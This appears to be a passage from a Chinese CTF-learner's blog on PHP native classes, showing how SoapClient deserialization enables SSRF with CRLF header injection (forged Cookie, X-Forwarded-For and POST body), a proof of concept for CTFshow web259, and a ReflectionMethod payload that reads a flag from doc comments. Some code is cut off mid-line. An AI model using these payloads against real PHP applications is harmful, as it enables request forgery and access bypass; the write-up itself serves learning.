关于题解网上有许多资源，这里就不再赘述。
###  4.SSRF
**[SoapClient](https://www.php.net/manual/en/class.soapclient.php)**
(PHP 5, PHP 7, PHP 8)
这里最早是在CTFshow的反序列化遇到的，当时都没听说过原生类，更不知道原生类还能SSRF,本类介绍最后来做一下这道题目
PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。
我的理解就是这个原生类大概类似Python中的requests库，可以与浏览器之间交互，并向其发送报文
函数形式：
    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
第一个参数为指明是否为wsdl模式，为null则为非wsdl模式
wsdl，就是一个xml格式的文档，用于描述Web Server的定义
第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置ilocation和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间
老规矩，还是本地测试一下，比翻博客更容易理解
测试代码：
    'http://192.168.61.140:2021/ki10Moc', 'uri'=>'http://192.168.61.140:2021'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
本地也起个端口来看一下回显
从图中可以看到这就是一次报文的发送，记录着HTTP的一些header信息
试着注入Cookie看一下
     $target, 'user_agent' => "ki10Moc\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4", 'uri' => 'test'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
从图中可以看到我们Use-Agent的信息已经替换成了ki10Moc
在学习的时候我突然想到暑假看到一个一篇关于CRLF攻击的文章  
那在这里我们可不可以将两者结合起来，构造恶意的payload头部信息
另外，通过http的报文信息可以发现Content-Type在UA头的下面
请求的报文由请求头和body组成，请求头内部和body换行都是一个\r\n，也就是一个换行符(\n)一个回车符(\r)，而两者之间是用两组换行符和回车符隔开，即\r\n\r\n
这里就是用CRLF(回车+换行的简称)注入一些恶意代码行执行。
[这里可以看看wooyun的关于CRLF介绍](https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html)
那么下面我们就来尝试一下
测试代码：
     $target,'user_agent'=>'Happy^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'ki10Moc'));
    $b = serialize($a);
    $b = str_replace('^^',"\r\n",$b);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
返回的信息
    Connection from 192.168.27.1 62590 received!
    POST / HTTP/1.1
    Host: 192.168.27.173:2023
    Connection: Keep-Alive
    User-Agent: Happy
    Content-Type: application/x-www-form-urlencoded
    X-Forwarded-For: 127.0.0.1
    Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958
    Content-Length: 12
    data=ki10Moc
    Content-Type: text/xml; charset=utf-8
    SOAPAction: "ki10Moc#a"
    Content-Length: 368
从这里我们可以看到我们伪造的XFF头，注入的Cookie和UA头都是可以成功实现的
那么最后就来看一下让我认识Soapclint这个原生类的题目
**CTFshow web259**
源码：
    $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    array_pop($xff);
    $ip = array_pop($xff);
    if($ip!=='127.0.0.1'){
        die('error');
    }else{
        $token = $_POST['token'];
        if($token=='ctfshow'){
            file_put_contents('flag.txt',$flag);
        }
    }
$_SERVER[‘HTTP_X_FORWARDED_FOR’]会获取我们的XFF头的信息
并要求是127.0.0.1，token为ctfshow
poc：
     $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
    $a = serialize($b);
    $a = str_replace('^^',"\r\n",$a);
    echo urlencode($a);
    ?>
传参即可
###  5.获取注释内容
这是2021年国赛的时候，遇到的一个题目，也是我唯一做出来的题目….呜呜呜
**[ReflectionMethod](https://www.php.net/manual/zh/class.reflectionmethod.php)**
(PHP 5 >= 5.1.0, PHP 7, PHP 8)
ReflectionFunctionAbstract::getDocComment — 获取注释内容  
由该原生类中的getDocComment方法可以访问到注释的内容
**本人没有在网上找到环境，就用源码自己改了一下注释和flag**
源码：
    $rd());
这里rc是传入原生类名，rb和ra都是传入类的属性，rd时传入类方法，后面就是实例化并且调用该方法。
payload：
    ?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
这些就是CTF小白目前所遇到的所有PHP原生类，都是基础的介绍和学习，外加一点点自己的思考。
最后借乔布斯的名言结尾吧
**Stay hungry, stay foolish!**